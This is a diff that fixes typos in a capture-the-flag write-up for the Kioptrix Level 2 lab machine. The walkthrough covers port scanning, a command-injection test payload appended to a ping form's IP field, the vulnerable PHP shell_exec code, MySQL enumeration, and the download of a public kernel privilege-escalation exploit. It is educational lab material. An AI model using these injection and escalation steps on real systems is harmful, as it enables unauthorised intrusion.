@@ -45,7 +45,7 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 109.43 seconds
 ```
-The machine is running SSH, Apache on port 80 and 443, and this time there is a CUPS 1.1 and mySQL server.
+The machine is running SSH, Apache on port 80 and 443, and this time there is a CUPS 1.1 and MySQL server.
 
 ### 2. Investigate the web server
 This time, accessing the HTTP server gets a simple login form. The HTTPS version of the site errors out due to an invalid certificate, so for now this will be my focus. The login form does not present any errors to the user if invalid input is entered. Despite this, SQL injection can be attempted.
@@ -80,7 +80,7 @@ PING 10.1.1.74 (10.1.1.74) 56(84) bytes of data.
 3 packets transmitted, 3 received, 0% packet loss, time 2000ms
 rtt min/avg/max/mdev = 0.427/0.692/1.019/0.245 ms, pipe 2
 ```
-Basically this is returning the results of the ping command. As this is a PHP application, it is most likely making a call to system or sshell_exec with a parameter to accomplish this, which means command injection may be possible.
+Basically this is returning the results of the ping command. As this is a PHP application, it is most likely making a call to system or shell_exec with a parameter to accomplish this, which means command injection may be possible.
 ```bash
 10.1.1.74; whoami
 
@@ -218,7 +218,7 @@ if (isset($_POST['submit'])){
     }
 ?>
 ```
-As expected, the web app used a simple shell_exec with a paramater given by user input. Not good!
+As expected, the web app used a simple shell_exec with a parameter given by user input. Not good!
   
 Next, lets check out the SQL server.
 ```bash
@@ -281,7 +281,7 @@ Empty set (0.00 sec)
 
 mysql>
 ```
-This database is empty unfortunately. Finally we can check out the default mysql database.
+This database is empty unfortunately. Finally we can check out the default MySQL database.
 ```bash
 mysql> use mysql; show tables;
 use mysql; show tables;
@@ -374,10 +374,10 @@ CentOS release 4.5 (Final)
 kioptrix.level2
 ...
 ```
-This script consists of mostly just commands that can be ran manually, but having them in a script saves some time. Some of the more in-depth scripts wouldn't work on this machine due to incompatabilities with the version of bash. In any case, looking through the output, the use of CentOS 4.5 (released in 2007) warrented some investigation. There are some kernel exploits for this version, in in particular stood out - Rin0 privesc using ip_append_data(): https://www.exploit-db.com/exploits/9542.
+This script consists of mostly just commands that can be ran manually, but having them in a script saves some time. Some of the more in-depth scripts wouldn't work on this machine due to incompatabilities with the version of bash. In any case, looking through the output, the use of CentOS 4.5 (released in 2007) warrented some investigation. There are some kernel exploits for this version, in in particular stood out - Ring0 privesc using ip_append_data(): https://www.exploit-db.com/exploits/9542.
 
 ### 7. Set up the exploit
-In order exploit, the program has to be compiled and ran locally. This can be done as the machine already has gcc installed. So it's just a matter of retrieving the file, hosting it and wgetting it.
+In order to exploit, the program has to be compiled and ran locally. This can be done as the machine already has gcc installed. So it's just a matter of retrieving the file, hosting it, wgetting it onto the machine and compiling.
 ```bash
 kali@kali:~/Desktop/osc/kiol2$ wget https://www.exploit-db.com/raw/9542 -O ring0exploit.c
 --2020-10-27 03:56:47--  https://www.exploit-db.com/raw/9542
